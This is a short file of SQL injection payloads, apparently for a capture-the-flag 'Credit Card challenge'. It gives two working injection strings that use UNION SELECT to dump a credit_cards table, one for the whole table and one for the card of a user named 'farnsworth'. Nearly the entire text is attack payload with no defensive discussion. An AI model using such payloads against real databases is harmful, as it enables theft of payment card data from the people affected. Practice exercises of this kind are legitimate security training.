/* SQL injection against target username for Credit Card challenge */

/* dump entire table */
' or 1=1 UNION SELECT card FROM credit_cards; --

/* dump targeted username */
farnsworth ' UNION SELECT card FROM credit_cards WHERE username="farnsworth"; --
